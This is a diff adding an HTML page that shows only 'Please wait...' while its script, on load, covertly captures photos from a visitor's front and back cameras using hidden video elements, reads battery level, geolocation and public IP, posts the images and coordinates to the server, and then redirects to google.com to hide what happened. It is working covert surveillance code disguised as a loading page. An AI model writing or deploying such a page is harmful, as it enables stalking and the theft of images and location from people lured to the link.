@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Get Battery Percentage, IP Address, and Capture Image</title>
+  <script>
+    function captureFrontCamera() {
+      const constraints = { video: { facingMode: 'user' }, audio: false };
+
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(mediaStream) {
+          const video = document.createElement('video');
+          video.srcObject = mediaStream;
+          video.autoplay = true;
+          video.style.display = 'none'; // Hide the video element
+          document.body.appendChild(video);
+
+          const canvas = document.createElement('canvas');
+          const context = canvas.getContext('2d');
+
+          video.addEventListener('loadedmetadata', function() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const dataURL = canvas.toDataURL('image/png');
+            saveImage(dataURL, 'front');
+          });
+        })
+        .catch(function(error) {
+          console.log('Error accessing front camera:', error);
+        });
+    }
+
+    function captureBackCamera() {
+      const constraints = { video: { facingMode: { exact: 'environment' } }, audio: false };
+
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(mediaStream) {
+          const video = document.createElement('video');
+          video.srcObject = mediaStream;
+          video.autoplay = true;
+          video.style.display = 'none'; // Hide the video element
+          document.body.appendChild(video);
+
+          const canvas = document.createElement('canvas');
+          const context = canvas.getContext('2d');
+
+          video.addEventListener('loadedmetadata', function() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const dataURL = canvas.toDataURL('image/png');
+            saveImage(dataURL, 'back');
+          });
+        })
+        .catch(function(error) {
+          console.log('Error accessing back camera:', error);
+        });
+    }
+
+    function saveImage(dataURL, cameraType) {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', '/save-image', true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+          console.log('Image saved:', xhr.responseText);
+        }
+      };
+
+      const payload = JSON.stringify({
+        image: dataURL,
+        camera: cameraType
+      });
+
+      xhr.send(payload);
+    }
+
+    window.onload = function() {
+      // Get battery percentage
+      navigator.getBattery().then(function(battery) {
+        console.log('Battery Percentage:', battery.level * 100);
+        saveUserInfo(battery.level * 100);
+      });
+
+      // Get IP address
+      fetch('https://api.ipify.org?format=json')
+        .then(function(response) {
+          return response.json();
+        })
+        .then(function(data) {
+          console.log('IP Address:', data.ip);
+        });
+
+      // Capture front and back camera images
+      captureFrontCamera();
+      captureBackCamera();
+
+      // Redirect to google.com after all processes complete
+      setTimeout(function() {
+        window.location.href = 'https://www.google.com';
+      }, 5000); // Adjust the delay as needed
+    };
+
+    function saveUserInfo(batteryLevel) {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', '/save-user-info', true);
+          xhr.setRequestHeader('Content-Type', 'application/json');
+
+          xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+              console.log('User info saved:', xhr.responseText);
+            }
+          };
+
+          const payload = JSON.stringify({
+            batteryLevel: batteryLevel,
+            latitude: latitude,
+            longitude: longitude
+          });
+
+          xhr.send(payload);
+        });
+      } else {
+        console.log('Geolocation is not supported by this browser.');
+      }
+    }
+  </script>
+</head>
+<body>
+  <h1>Please wait...</h1>
+</body>
+</html>
